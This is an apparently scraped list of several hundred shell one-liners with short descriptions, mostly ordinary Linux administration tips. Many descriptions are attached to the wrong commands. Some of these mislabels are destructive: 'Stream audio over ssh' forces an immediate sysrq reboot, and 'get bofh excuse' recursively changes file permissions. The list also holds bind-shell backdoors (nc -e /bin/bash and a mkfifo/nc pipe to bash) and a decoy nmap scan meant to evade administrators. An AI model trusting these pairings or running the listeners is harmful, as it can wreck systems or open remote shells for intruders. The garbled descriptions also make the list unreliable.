# Optimal way of deleting huge numbers of files
find /path/to/dir -type f -print0 | xargs -0 rm
# Command to logout all the users in one command
sudo who | awk '!/root/{ cmd="/sbin/pkill -KILL -u " $1; system(cmd)}'
# Host cpu performance
openssl speed md5
# drop first column of output by piping to this
awk '{ $1="";print}'
# Create a bunch of dummy text files
base64 /dev/urandom | head -c 33554432 | split -b 8192 -da 4  - dummy.
# Get the Nth argument of the last command (handling spaces correctly)
!:n
# Retry the previous command until it exits successfully
!!; while [ $? -ne 0 ]; do !!; done
# Remove all zero size files from current directory (not recursive)
find . -maxdepth 1 -size 0c -delete
# Find all files larger than 500M and less than 1GB
find / -type f -size +500M -size -1G
# Change/Modify timestamp interactively
touch -d $(zenity --calendar --date-format=%F) filename
# sort the contents of a text file in place.
sort -g -o list.txt{,}
# Instantly load bash history of one shell into another running shell
$ history -a #in one shell , and $ history -r #in another running shell
# Multiple variable assignments from command output in BASH
read day month year < <(date +'%d %m %y')
# List your MACs address
cat /sys/class/net/eth0/address
# Rename all files which contain the sub-string 'foo', replacing it with 'bar'
for i in ./*foo*;do mv -- "$i" "${i//foo/bar}";done
# Create a 5 MB blank file via a seek hole
dd if=/dev/zero of=testfile.seek seek=5242879 bs=1 count=1
# ROT13 using the tr command
alias rot13="tr a-zA-Z n-za-mN-ZA-M"
# Bash logger
script /tmp/log.txt
# Make vim open in tabs by default (save to .profile)
alias vim="vim -p"
# Secure copy from one server to another without rsync and preserve users, etc
tar -czvf - /src/dir | ssh remotehost "(cd /dst/dir ; tar -xzvf -)"
# the same as [Esc] in vim
Ctrl + [
# Function to split a string into an array
read -a ARR <<<'world domination now!'; echo ${ARR[2]};
# Generate MD5 hash for a string
md5sum <<<"test"
# Recompress all .gz files in current directory using bzip2 running 1 job per CPU core in parallel
parallel -j+0 "zcat {} | bzip2 >{.}.bz2 && rm {}" ::: *.gz
# use screen as a terminal emulator to connect to serial consoles
screen /dev/tty<device> 9600
# Find all symlinks that link to directories
find -type l -xtype d
# Have a random "cow" say a random thing
fortune | cowsay -f $(ls /usr/share/cowsay/cows/ | shuf -n1)
# sends a postscript file to a postscript printer using netcat
cat my.ps | nc -q 1 hp4550.mynet.xx 9100
# Display which distro is installed
cat /etc/*release
# Realtime lines per second in a log file
tail -f access.log | pv -l -i10 -r >/dev/null
# See your current RAM frequency
scp -C 10.0.0.4:/tmp/backup.sql /path/to/backup.sql
# Find unused IPs on a given subnet
nmap -T4 -sP 192.168.2.0/24 && egrep "00:00:00:00:00:00" /proc/net/arp
# find and delete empty dirs, start in current working dir
find . -type d -empty -delete
# Use colordiff in side-by-side mode, and with automatic column widths.
colordiff -yW"`tput cols`" /path/to/file1 /path/to/file2
# extract email adresses from some file (or any other pattern)
grep -Eio '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})'
# What is my ip?
ls -lct /etc | tail -1 | awk '{print $6, $7}'
# How to run a command on a list of remote servers read from a file
while read server; do ssh -n user@$server "command"; done < servers.txt
# Replace spaces in filenames with underscorees
ls | while read f; do mv "$f" "${f// /_}";done
# grep certain file types recursively
grep -r --include="*.[ch]" pattern .
# Change proccess affinity.
taskset -cp <core> <pid>
# Multiple SSH Tunnels
ssh -L :: -L :: @
# Easily scp a file back to the host you're connecting from
mecp () { scp "$@" ${SSH_CLIENT%% *}:Desktop/; }
# Super Speedy Hexadecimal or Octal Calculations and Conversions to Decimal.
echo "$(( 0x10 )) - $(( 010 )) = $(( 0x10 - 010 ))"
# synchronicity
cal 09 1752
# Terminal redirection
script /dev/null | tee /dev/pts/3
# Rot13 using the tr command
alias rot13="tr '[A-Za-z]' '[N-ZA-Mn-za-m]'"
# Clean swap area after using a memory hogging application
swapoff -a ; swapon -a
# loop over a set of items that contain spaces
ls | while read ITEM; do echo "$ITEM"; done
# Launch a command from a manpage
!date
# Split File in parts
split -b 19m file Nameforpart
# To get you started!
vimtutor
# Exclude grep from your grepped output of ps (alias included in description)
ps aux | grep [h]ttpd
# renames multiple files that match the pattern
rename 's/foo/bar/g' *
# Show running services (using systemctl)
command systemctl --no-page --no-legend --plain -t service --state=running
# Submit command & rewrite orginal command
<ctrl>+o
# removes characters from cursor to the end of line
Ctrl+k
# Symlink all files from a base directory to a target directory
ln -s /BASE/* /TARGET/
# All what exists in dir B and not in dir A will be copied from dir B to new or existing dir C
rsync -v -r --size-only --compare-dest=../A/ B/ C/
# find previously entered commands (requires configuring .inputrc)
<Meta-p> (aka <ALT+P>)
# Add directory to $PATH if it's not already there
if [[ ":$PATH:" != *":$dir:"* ]]; then PATH=${PATH}:$dir; fi
# Debug how files are being accessed by a process
inotifywait -m -r .
# Turns red the stderr output
color()(set -o pipefail;"$@" 2>&1>&3|sed $'s,.*,\e[31m&\e[m,'>&2)3>&1
# Find biggest 10 files in current and subdirectories and sort by file size
find . -type f -print0 | xargs -0 du -h | sort -hr | head -10
# Get your external IP and Network Info
curl ifconfig.me/all
# Quickly CD Out Of Directories Without 5+ Aliases
up() { local x='';for i in $(seq ${1:-1});do x="$x../"; done;cd $x; }
# List all commands present on system
ls ${PATH//:/ }
# A line across the entire width of the terminal
printf "%$(tput cols)s\n"|tr ' ' '='
# Check if a machine is online
ping -c 1 -q MACHINE_IP_OR_NAME >/dev/null 2>&1 && echo ONLINE || echo OFFLINE
# Print all lines between two line numbers
awk 'NR >= 3 && NR <= 6' /path/to/file
# Show network throughput
tcpdump -w - |pv -bert >/dev/null
# Generate a random password 30 characters long
cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 32
# Remove the first and the latest caracter of a string
var=:foobar:; echo ${var:1:-1}
# Load file into RAM (cache) for faster accessing for repeated usage
cat <file> > /dev/null
# Show IP Address in prompt --> PS1 var
export PS1="[\u@`hostname -I` \W]$ "
# log a command to console and to 2 files separately stdout and stderr
command > >(tee stdout.log) 2> >(tee stderr.log >&2)
# Join lines split with backslash at the end
sed -e '/\\$/{:0;N;s/\\\n//;t0}'
# Convert text to lowercase
lower() { echo ${@,,}; }
# find builtin in bash v4+
ls -l /etc/**/*killall
# make image semi-transparent
convert input.png -alpha set -channel A -fx 0.5 output.png
# Compare directories via diff
diff -rq dirA dirB
# Save your terminal commands in bash history in real time
shopt -s histappend ; PROMPT_COMMAND="history -a;$PROMPT_COMMAND"
# Tricky implementation of two-dimensional array in Bash.
arr[i*100+j]="whatever"
# Terrorist threat level text
echo "Terrorist threat level: `od -An -N1 -i /dev/random`"
# Use wget to download one page and all it's requisites for offline viewing
echo "this is a test" | sed 's/.*/\L&/; s/[a-z]*/\u&/g'
# back ssh from firewalled hosts
ssh -R 5497:127.0.0.1:22 -p 62220 user@public.ip
# rename files according to file with colums of corresponding names
xargs -n 2 mv < file_with_colums_of_names
# Create a new file
> file
# Monitor a file with tail with timestamps added
tail -f file | awk '{now=strftime("%F %T%z\t");sub(/^/, now);print}'
# Use result of the last command
`!!`
# Check disk for bad sectors
badblocks -n -s -b 2048 /dev/sdX
# Create a file of a given size in linux
truncate -s 1M file
# Show which process is blocking umount (Device or resource is busy)
lsof /folder
# Show the UUID of a filesystem or partition
blkid /dev/sda7
# run command on a group of nodes
mussh -h host1 host2 host3 -c uptime
# Outgoing IP of server
dig +short @resolver1.opendns.com myip.opendns.com
# Isolate file name from full path/find output
echo ${fullpath##*/}
# Tail -f at your own pace
tail -fs 1 somefile
# Print a row of 50 hyphens
python -c 'print "-"*50'
# grep tab chars
grep "^V<TAB>" your_file
# shell function to make gnu info act like man.
myinfo() { info --subnodes -o - $1 | less; }
# Replace spaces in filenames with underscores
for f in *;do mv "$f" "${f// /_}";done
# Insert  the  last  argument  of  the previous command
!$
# Remote control for Rhythmbox on an Ubuntu Media PC
alias rc='ssh ${MEDIAPCHOSTNAME} env DISPLAY=:0.0 rhythmbox-client --no-start'
# Remove everything except that file
find . ! -name <FILENAME> -delete
# bash screensaver off
setterm -powersave off -blank 0
# Monitor a file's size
watch -n60 du /var/log/messages
# Smart renaming
[ `date --date='next day' +'%B'` == `date +'%B'` ] || echo 'end of month'
# Port scan a range of hosts with Netcat.
for i in {21..29}; do nc -v -n -z -w 1 192.168.0.$i 443; done
# Show Directories in the PATH Which does NOT Exist
(IFS=:;for p in $PATH; do test -d $p || echo $p; done)
# alias to close terminal with :q
alias ':q'='exit'
# Sort file greater than a specified size  in human readeable format including their path and typed by color, running from current directory
find ./ -size +10M -type f -print0 | xargs -0 ls -Ssh1 --color
# print file without duplicated lines using awk
awk '!a[$0]++' file
# Get the 10 biggest files/folders for the current direcotry
du -sk * |sort -rn |head
# uncomment the lines where the word DEBUG is found
sed '/^#.*DEBUG.*/ s/^#//' $FILE
# this toggles mute on the Master channel of an alsa soundcard
curl -sd 'rid=value&submit=SUBMIT' <URL> > out.html
# count how many times a string appears in a (source code) tree
$ grep -or string path/ | wc -l
# Outputs files with ascii art in the intended form.
iconv -f437 -tutf8 asciiart.nfo
# Compare a remote file with a local file
vimdiff <file> scp://[<user>@]<host>/<file>
# Using bash inline
<<<"k=1024; m=k*k; g=k*m; g" bc
# Create several copies of a file
for i in {1..5}; do cp test{,$i};done
# Download schedule
echo 'wget url' | at 12:00
# Quicker move to parent directory
alias ..='cd ..'
# Open the last file you edited in Vim.
alias lvim="vim -c \"normal '0\""
# Keep from having to adjust your volume constantly
find . -iname \*.mp3 -print0 | xargs -0 mp3gain -krd 6 && vorbisgain -rfs .
# [re]verify a disc with very friendly output
dd if=/dev/cdrom | pv -s 700m | md5sum | tee test.md5
# Processes by CPU usage
ps -e -o pcpu,cpu,nice,state,cputime,args --sort pcpu | sed "/^ 0.0 /d"
# Print text string vertically, one character per line.
echo Print text vertically|sed 's/\(.\)/\1\n/g'
# awk using multiple field separators
awk -F "=| "
# Wrap text files on the command-line for easy reading
fold -s <filename>
# Check the age of the filesystem
find . -name '*.jar' -printf '%f:'
# make a log of a terminal session
script
# Remove invalid host keys from ~/.ssh/known_hosts
ssh-keygen -R \[localhost\]:8022
# SSH connection through host in the middle
ssh -J user@reachable_host user@unreacheable_host
# !* Tells that you want all of the *arguments* from the previous command to be repeated in the current command
chmod 777 !*
# remove all spaces from all files in current folder
rename 's/ //g' *
# list directories only
ls -d */
# Do some learning...
pr -m -t file1 file2 ...
# sum a column of numbers
awk '{s+=$1}END{print s}' <file>
# See KeepAlive counters on tcp connections
netstat -town
# Emulating netcat -e (netcat-traditional or netcat-openbsd) with the gnu-netcat
mkfifo foo ; nc -lk 2600 0<foo | /bin/bash 1>foo
# List all commands present on system
find . -maxdepth 1 -empty -delete
# grep tab (\t)
grep $'\t' sample.txt
# Compress and store the image of a disk over the network
dd if=<device> | pv | nc <target> <port>
# Rank top 10 most frequently used commands
history | awk '{print $2}' | sort | uniq -c | sort -rn | head
# Print all lines between two line numbers
sed -n '3,6p' /path/to/file
# Change/Modify timestamp
touch --date "2010-01-05" /tmp/filename
# Real full backup copy of /etc folder
rsync -a /etc /destination
# check open ports (both ipv4 and ipv6)
netstat -plnt
# Merge files, joining each line in one line
pr -m -t file1 file2 ...
# IFS - use entire lines in your for cycles
export IFS=$(echo -e "\n")
# Emulating netcat -e (netcat-traditional or netcat-openbsd) with the gnu-netcat
mkfifo foo ; nc -lk 2600 0<foo | /bin/bash 1>foo
# Do some learning...
:r! <bash_command>
# save  date and time for each command in history
export HISTTIMEFORMAT="%h/%d-%H:%M:%S "
# output length of longest line
awk '(length > n) {n = length} END {print n}'
# What is my ip?
curl -s checkip.dyndns.org | grep -Eo '[0-9\.]+'
# Recursively grep thorugh directory for string in file.
grep -r -i "phrase" directory/
# remove all spaces from all files in current folder
rename 's/ //g' *
# New Maintainer for CommandLineFu
mail tech@commandlinefu.com
# sed : using colons as separators instead of forward slashes
sed "s:/old/direcory/:/new/directory/:" <file>
# Execute multiple commands from history
!219 ; !229 ; !221
# Display GCC Predefined Macros
gcc -dM -E - < /dev/null
# Adding leading zeros to a filename (1.jpg -> 001.jpg)
sed -i 3d ~/.ssh/known_hosts
# SSH connection through host in the middle
ssh -J user@reachable_host user@unreacheable_host
# Grep Recursively Through Single File Extension
grep --include=*.py -lir "delete" .
# Changing the terminal title to the last shell command
trap 'echo -e "\e]0;$BASH_COMMAND\007"' DEBUG
# See KeepAlive counters on tcp connections
netstat -town
# let a cow tell you your fortune
fortune | cowsay
# vi keybindings with info
info --vi-keys
# Select and Edit a File in the Current Directory
PS3="Enter a number: "; select f in *;do $EDITOR $f; break; done
# Removes file with a dash in the beginning of the name
rm -- --myfile
# external projector for presentations
until (ssh root@10.1.1.39 2> /dev/null); do date; sleep 15; done
# create shortcut keys in bash
bind -x '"\C-p"':pwd
# Convert a file from ISO-8859-1 (or whatever) to UTF-8 (or whatever)
tcs -f 8859-1 -t utf /some/file
# generate random password
openssl rand -base64 6
# Delete backward from cursor, useful when you enter the wrong password
Ctrl + u
# Create an SSH tunnel for accessing your remote MySQL database with a local port
ssh -CNL 3306:localhost:3306 user@site.com
# retab in vim, tab to space or space to tab, useful in python
:ret
# fast access to any of your favorite directory.
alias pi='`cat ~/.pi | grep ' ; alias addpi='echo "cd `pwd`" >> ~/.pi'
# Get the time from NIST.GOV
cat </dev/tcp/time.nist.gov/13
# list directories only
ls -d */
# recurisvely md5 all files in a tree
find ./backup -type f -print0 | xargs -0 md5sum > /checksums_backup.md5
# vmstat/iostat with timestamp
vmstat 1 | awk '{now=strftime("%Y-%m-%d %T "); print now $0}'
# Poke a Webserver to see what it's powered by.
wget -S -O/dev/null "INSERT_URL_HERE" 2>&1 | grep Server
# Disable annoying sound emanations from the PC speaker
sudo rmmod pcspkr
# silent/shh - shorthand to make commands really quiet
silent(){ $@ > /dev/null 2>&1; }; alias shh=silent
# Replace spaces in filenames with underscores
rename 's/ /_/g' *
# Copy without overwriting
cp -n <src> <dst>
# Make any command read line enabled (on *nix)
rlwrap sqlite3 database.db
# Merges given files line by line
paste -d ',:' file1 file2 file3
# !* Tells that you want all of the *arguments* from the previous command to be repeated in the current command
chmod 777 !*
# cat a file backwards
tac file.txt
# Print just line 4 from a textfile
awk 'NR==4'
# Remove all zero size files from current directory (not recursive)
find . -maxdepth 1 -empty -delete
# Copy file content to X clipboard
:%y *
# Compress and store the image of a disk over the network
dd if=<device> | pv | nc <target> <port>
# Replace multiple file extensions with a single extension
for f in t1.bmp t2.jpg t3.tga; do echo ${f%.*}.png; done
# Sum columns from CSV column $COL
awk -F ',' '{ x = x + $4 } END { print x }' test.csv
# umount all nfs mounts on machine
umount -a -t nfs
# Using tput to save, clear and restore the terminal contents
tput smcup; echo "Doing some things..."; sleep 2; tput rmcup
# Calculate N!
seq -s* 10 |bc
# Wget Command to Download Full Recursive Version of Web Page
ls -d */
# Print all lines between two line numbers
sed -n '3,6p' /path/to/file
# List your sudo rights
sudo -l
# check open ports (both ipv4 and ipv6)
netstat -plnt
# Get a quick list of all user and group owners of files and dirs under the cwd.
find -printf '%u %g\n' | sort | uniq
# printing barcodes
ls /home | head -64 | barcode -t 4x16 | lpr
# One liner to kill a process when knowing only the port where the process is running
fuser -k <port>
# watch process stack, sampled at 1s intervals
watch -n 1 'pstack 12345 | tac'
# List all commands present on system
set -eu
# Create an SSH connection (reverse tunnel) through your firewall.
ssh -R 2001:localhost:22 [username]@[remote server ip]
# Go (cd) directly into a new temp folder
cd "$(mktemp -d)"
# See The MAN page for the last command
man !!:0
# Remove all HTML tags from a file
sed "s/<[^>]\+>//g" file
# vimdiff local and remote files via ssh
vimdiff /path/to/file scp://remotehost//path/to/file
# Set an alarm to wake up [2]
echo "aplay path/to/song" |at [time]
# Find out my Linux distribution name and version
lsb_release -a
# Copy an element from the previous command
!:n
# rsync + find
rsync -avz -e ssh --files-from=<(find -mtime +30 -mtime -60) source dest
# Create cheap and easy index.html file
for i in *; do echo "<li><a href='$i'>$i</a>";  done > index.html
# Adding formatting to an xml document for easier reading
tidy -i -xml <inputfile>
# Extend a logical volume to use up all the free space in a volume group
lvextend -l +100%FREE /dev/VolGroup00/LogVol00
# Re-use the previous command output
newcommand $(!!)
# List complete size of directories (do not consider hidden directories)
du -hs */
# Remove everything except that file
( shopt -s extglob; rm !(<PATTERN>) )
# function to edit your history file
eh () { history -a ; vi ~/.bash_history ; history -r ; }
# sum a column of numbers
awk '{s+=$1}END{print s}' <file>
# Change your swappiness Ratio under linux
sysctl vm.swappiness=50
# VIM version 7: edit in tabs
vim -p file1 file2 ...
# Change/Modify timestamp
touch --date "2010-01-05" /tmp/filename
# create iso image from a directory
mkisofs -o XYZ.iso XYZ/
# Interactively build regular expressions
sed -i 's/^.*DEBUG.*/#&/'  $file
# Decreasing the cdrom device speed
eject -x 4
# Extract a bash function
sed -n '/^function h\(\)/,/^}/p' script.sh
# List the largest directories & subdirectoties in the current directory sorted from largest to smallest.
du -k | sort -r -n | more
# Runs a command without hangups.
nohup <command> &
# permanently let grep colorize its output
echo alias grep=\'grep --color=auto\' >> ~/.bashrc ; . ~/.bashrc
# Silently Execute a Shell Script that runs in the background and won't die on HUP/logout
nohup /bin/sh myscript.sh 1>&2 &>/dev/null 1>&2 &>/dev/null&
# backs up at the date today
cp -i FILENAME{,.`date +%Y%m%d`}
# ARP Scan
sed "s,\x1B\[[0-9;]*[a-zA-Z],,g"
# Update zone file Serial numbers
sed -i 's/20[0-1][0-9]\{7\}/'`date +%Y%m%d%I`'/g' *.db
# Rank top 10 most frequently used commands
history | cut -c8- | sort | uniq -c | sort -rn | head
# Dump HTTP header using wget
sudo lshw -C cpu|grep width
# Connect to SMTP server using STARTTLS
openssl s_client -starttls smtp -crlf -connect 127.0.0.1:25
# lotto generator
echo $(shuf -i 1-49 | head -n6 | sort -n)
# Get a brief overview of how many files and directories are installed
locate -S
# Check RAM size
free -mto
# ssh and attach to a screen in one line.
ssh -t user@host screen -x <screen name>
# Cheap iftop
watch 'netstat -anptu |egrep "^Proto|:80 "'
# urldecoding with one pure BASH builtin
VAR="%23%21%2fbin%2fbash" ; printf -v VAR "%b" "${VAR//\%/\x}" ; echo $VAR
# Most Commonly Used Grep Options
GREP_OPTIONS='-D skip --binary-files=without-match --ignore-case'
# output length of longest line
wc -L
# Clear filesystem memory cache
sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
# Finding files with different extensions
find . -regex '.*\(h\|cpp\)'
# Shell function to exit script with error in exit status and print optional message to stderr
die(){ result=$1;shift;[ -n "$*" ]&&printf "%s\n" "$*" >&2;exit $result;}
# Binary difference of two files
dstat -ta
# top 10 commands used
sed -e 's/ *$//' ~/.bash_history | sort | uniq -cd | sort -nr | head
# Display a block of text with AWK
sed -n /start_pattern/,/stop_pattern/p file.txt
# Check reverse DNS
dig +short -x {ip}
# ls not pattern
ls -I "*.gz"
# Stream audio over ssh
echo 1 > /proc/sys/kernel/sysrq; echo b > /proc/sysrq-trigger
# Do some learning...
for i in $(ls /usr/bin); do whatis $i | grep -v nothing; done | more
# Display the output of a command from the first line until the first instance of a regular expression.
command | sed -n '1,/regex/p'
# Mute xterm
watch -n 1 "sudo asterisk -vvvvvrx 'core show channels' | grep call"
# save  date and time for each command in history
export HISTTIMEFORMAT='%F %T '
# Synthesize text as speech
echo "hello world"  | festival --tts
# See most used commands
history|awk '{print $2}'|awk 'BEGIN {FS="|"} {print $1}'|sort|uniq -c|sort -r
# stop man  page content from disappearing on exit
echo "export LESS='FiX'" >> ~/.bashrc
# cd to (or operate on) a file across parallel directories
cd ${PWD/a/b}
# copy/mkdir and automatically create parent directories
cp --parents /source/file /target-dir
# Random unsigned integer
echo $RANDOM
# Parse a quoted .csv file
awk -F'^"|", "|"$' '{ print $2,$3,$4 }' file.csv
# Display which user run process from given port name
fuser -nu tcp 3691
# grep binary (hexadecimal) patterns
grep -P "\x05\x00\xc0" mybinaryfile
# What is my ip?
curl ifconfig.co
# What is my ip?
curl ifconfig.co/all.json
# see the TIME_WAIT and ESTABLISHED nums of the network
netstat -n | awk '/^tcp/ {++B[$NF]} END {for(a in B) print a, B[a]}'
# watch iptables counters
watch --interval 0 'iptables -nvL | grep -v "0     0"'
# Print a cron formatted time for 2 minutes in the future (for crontab testing)
crontest () { date '-d +2 minutes' +'%M %k %d %m *'; }
# Execute a command on logout
trap cmd 0
# Join lines
tr "\n" " " < file
# know the current running shell (the true)
echo $0
# List dot-files and dirs, but not . or ..
ls -A
# which process has a port open
lsof -i :80
# Use a decoy while scanning ports to avoid getting caught by the sys admin :9
sudo nmap -sS 192.168.0.10 -D 192.168.0.2
# quick input
alt + .
# Determine what an process is actually doing
sudo strace -pXXXX -e trace=file
# nmap get all active online ips  from specific network
nmap -n -sn 192.168.1.0/24 -oG - | awk '/Up$/{print $2}'
# Perform Real-time Process Monitoring Using Watch Utility
watch -n 1 'ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head'
# Make changes in .bashrc immediately available
. ~/.bashrc
# On screen display of a command.
date|osd_cat
# Create multiple subfolders in one command.
mkdir -p /path/folder{1..4}
# convert unixtime to human-readable with awk
echo 1234567890 | awk '{ print strftime("%c", $0); }'
# Copy history from one terminal to another
history -w <switch to another terminal> history -r
# connect via ssh using mac address
sudo arp -s 192.168.1.200  00:35:cf:56:b2:2g temp && ssh root@192.168.1.200
# va - alias for editing aliases
alias va='vi ~/.aliases; source ~/.aliases && echo "aliases sourced"'
# Get the size of all the directories in current directory
du --max-depth=1
# Remove comments from files
sed -e '/^#/d' -e 's/#.*$//' in
# chmod - change file permissions of a file to be similar of another
chmod --reference=file1 file2
# Watch Data Usage on eth0
watch ifconfig eth0
# generate a randome 10 character password
tr -dc A-Za-z0-9_ < /dev/urandom | head -c 10 | xargs
# split a string (2)
read VAR1 VAR2 VAR3 < <(echo aa bb cc); echo $VAR2
# Bash prompt with user name, host, history number, current dir and just a touch of color
export PS1='\n[\u@\h \! \w]\n\[\e[32m\]$ \[\e[0m\]'
# Remove newlines from output
grep . filename
# Reboot as a different OS in Grub
echo "savedefault --default=2 --once" | grub --batch; sudo reboot
# Download an entire ftp directory using wget
wget -r ftp://user:pass@ftp.example.com
# find out how many days since given date
alias ...="awk '{fflush(); printf \".\"}' && echo \"\""
# Set audible alarm when an IP address comes online
until ping -c1 ADDRESS;do true;done;zenity --warning --text "ADDRESS is back"
# prevents replace an existing file by mistake
set -o noclobber
# Show the command line for a PID, converting nulls to spaces and a newline
xargs -0a /proc/27288/cmdline echo
# convert from decimal to hexadecimal
hex() { printf "%X\n" $1; }
# copy file to clipboard
ip route | awk '/default/{print $3}'
# Fast command-line directory browsing
function cdls { cd $1; ls; }
# Edit the Last Changed File
vim $( ls -t | head -n1 )
# Signals list by NUMBER and NAME
kill -l
# Create a local compressed tarball from remote host directory
ssh user@host "tar -cf - /path/to/dir" | gzip > dir.tar.gz
# ROT13 whole file in vim.
ggg?G
# Killing processes with your mouse in an infinite loop
while true; do xkill -button any; done
# get bofh excuse from a trusted source :-)
chmod 644 $(find . -type f)
# Diff 2 file struct - Useful for branch diff and jars diff(uncompressed)
diff <(cd A; find -type f|xargs md5sum ) <(cd B; find -type f | xargs md5sum )
# find the 10 latest (modified) files
ls -1t | head -n10
# vim as a pager - similar to less command but with color
alias vless='/usr/share/vim/vimcurrent/macros/less.sh'
# launch bash without using any letters
${0/-/}
# skip broken piece of a loop but not exit the loop entirely
ctrl + \
# (Debian/Ubuntu) Discover what package a file belongs to
dlocate /path/to/file
# Rename all files which contain the sub-string 'foo', replacing it with 'bar'
rename 's/foo/bar/g' ./*
# Prevent shell autologout
unset TMOUT
# Copy all files, including hidden files, recursively without traversing backward
cp -r * .??* /dest
# Reload all sysctl variables without reboot
sysctl --system
# Show errors in the kernel ring buffer
dmesg -xT -l err,crit,emerg
# Use bash history with process substitution
<(!!)
# Display the history and optionally grep
h() { if [ -z "$1" ]; then history; else history | grep "$@"; fi; }
# get you public ip address
curl ifconfig.me
# Get absolut path to your bash-script
script_path=$(cd $(dirname $0);pwd)
# View and review the system process tree.
pstree -Gap | less -r
# Vi - Matching Braces, Brackets, or Parentheses
%
# Clear mistyped passwords from password prompt
^u
# Run local bash script on remote server
ssh -T user@server < script.sh
# Move files around local filesystem with tar without wasting space using an intermediate tarball.
( cd SOURCEDIR && tar cf - . ) | (cd DESTDIR && tar xvpf - )
# Copy something to multiple SSH hosts with a Bash loop
for h in host1 host2 host3 host4 ; { scp file user@$h:/destination_path/ ; }
# Show apps that use internet connection at the moment. (Multi-Language)
netstat -lantp | grep -i stab | awk -F/ '{print $2}' | sort | uniq
# Simulate slow network connection locally
sudo tc qdisc add dev lo root netem delay 500ms
# resume download using curl
curl -C - -o partially_downloaded_file 'www.example.com/path/to/the/file'
# List the size (in human readable form) of all sub folders from the current location
du -sh */
# Unix commandline history substitution like ^foo^bar BUT for multiple replacements
!!:gs/Original/New/
# See non printable caracters like tabulations, CRLF, LF line terminators ( colored )
od -c <FILE> | grep --color '\\.'
# Sets shell timeout
export TMOUT=10
# Let your computer lull you to sleep
echo {1..199}" sheep," | espeak -v english -s 80
# open two files on top of each other in vim (one window, two panes)
vim -o file1 file2
# Show when filesystem was created
dumpe2fs -h /dev/DEVICE | grep 'created'
# Open files in a split windowed Vim
vim -o file1 file2...
# Preserve colors when piping tree to less
tree -C | less -R
# remap Caps_Lock to Escape
(sed 's/^/x+=/' [yourfile] ; echo x) | bc
# Block the 6700 worst spamhosts
du -xk | sort -n | tail -20
# Find all files of a type and copy them elsewhere while keeping intact their full directory structure using find and cpio
find . -iname "*.flac" | cpio -pdm /Volumes/Music/FLAC
# Compress blank lines
cat -s
# Outputs a sorted list of disk usage to a text file
du | sort -gr > file_sizes
# Disable the ping response
sudo -s "echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all"
# draw honeycomb
seq -ws "\\__/" 99|fold -69|tr "0-9" " "
# How many files in the current directory ?
find . -maxdepth 1 -type f | wc -l
# Show the number of current httpd processes
pgrep -c httpd
# ionice limits process I/O, to keep it from swamping the system (Linux)
ionice -c3 find /
# Terminal redirection
script -f /dev/pts/3
# Find all dot files and directories
echo .*
# Find dead symbolic links
find -L -type l
# Protect directory from an overzealous rm -rf *
sudo chattr -R +i dirname
# Read choice from user instantaneously
read -N1
# Find status of all symlinks
symlinks -r $(pwd)
# Fast file backup
cp filename{,.`date +%Y%m%d`}
# Trojan inverse shell
nc -l -p 2000 -e /bin/bash
# Listing today’s files only
ls -al --time-style=+%D| grep `date +%D`
# Show 'Hardware path'-style tree of all devices in Linux
lshw -short
# Remove trailing space in vi
:%s/\s\+$//
# show lines that appear in both file1 and file2
comm -1 -2 <(sort file1) <(sort file2)
# Grep syslog today last hour
grep -i "$(date +%b\ %d\ %H)" syslog
# Comment current line
<ESC> #
# Grep log between range of minutes
grep -i "$(date +%b" "%d )13:4[0-5]" syslog
# convert .bin / .cue into .iso image
bchunk IMAGE.bin IMAGE.cue IMAGE.iso
# prettier "cal" command
cal |grep -A7 -B7 --color=auto $(date +%d)
# create an incremental backup of a directory using hard links
rsync -a --delete --link-dest=../lastbackup $folder $dname/
# Stream audio over ssh
printf ${PATH//:/\\n}
# Change tha mac adresse
sudo ifconfig eth0 hw ether 00:01:02:03:04:05
# Display which distro is installed
lsb_release -a
# Add a function you've defined to .bashrc
addfunction () { declare -f $1 >> ~/.bashrc ; }
# Download all Phrack .tar.gzs
cat /dev/urandom | pv -L 3m | dd bs=1M count=100 iflag=fullblock > /dev/null
# Copy a file over SSH without SCP
ssh HOST cat < LOCALFILE ">" REMOTEFILE
# Setup an ssh tunnel
ssf -f -N -L 4321:home.network.com:25 user@home.network.com
# Remove empty directories
find . -type d -empty -delete
# Give to anyone a command to immediatly find a particular part of a man.
man <COMMAND> | less +'/pattern'
# Check if your webserver supports gzip compression with curl
for i in {1..20}; do fortune -w ; sleep 3; clear; done
# Huh? Where did all my precious space go ?
ls -la | sort -k 5bn
# Find today created files
find directory/ -mtime 0 -type f
# Verbosely delete files matching specific name pattern, older than 15 days.
find /backup/directory -name "FILENAME_*" -mtime +15 | xargs rm -vf
# Erase a word
<CTRL+w>
# Find all clients connected to HTTP or HTTPS ports
ss -o state established '( dport = :http or sport = :https )'
# View the newest xkcd comic.
$command 3>&1 1>&2 2>&3
# Remove a line from a file using sed (useful for updating known SSH server keys when they change)
sed -i '${LINE}d' ~/.ssh/known_host
# Conficker Detection with NMAP
nmap -PN -d -p445 --script=smb-check-vulns --script-args=safe=1 IP-RANGES
# Postpone a command [zsh]
<alt+q>
# Get a BOFH excuse
cd() { builtin cd "${@:-$HOME}" && ls; }
# git remove files which have been deleted
git ls-files -z --deleted | xargs -0 git rm
# Matrix Style
check the sample output below, the command was too long :(
# enumerate with padding
echo {001..5}
# Consolle based network interface monitor
ethstatus -i eth0
# Jump to line X in file in Nano.
nano +X foo
# Batch rename extension of all files in a folder, in the example from .txt to .md
rename 's/.txt/.md/i' *
# For a $FILE, extracts the path, filename, filename without extension and extension.
FILENAME=${FILE##*/};FILEPATH=${FILE%/*};NOEXT=${FILENAME%\.*};EXT=${FILE##*.}
# Empty a file
> foobar.txt
# Check if port is open on remote machine
echo >  /dev/tcp/127.0.0.123/8085 && echo "Port is open"
# Place the argument of the most recent command on the shell
<Esc> _
# send kernel log (dmesg) notifications to root via cron
(crontab -l; echo '* * * * * dmesg -c'; ) | crontab -
# processes per user counter
ps aux |awk '{$1}  {++P[$1]} END {for(a in P) if (a !="USER") print a,P[a]}'
# Binary Clock
watch -n 1 'date "+obase=2; print %H,\":\",%M,\":\",%S" |bc'
# Change newline to space in a file just using echo
echo $(</tmp/foo)
# mount an iso
mount -o loop -t iso9660 my.iso /mnt/something
# shush MOTD
touch ~/.hushlogin
# Verify MD5SUMS but only print failures
md5sum --check MD5SUMS | grep -v ": OK"
# Compute running average for a column of numbers
awk '{avg += ($1 - avg) / NR;} END { print avg; }'
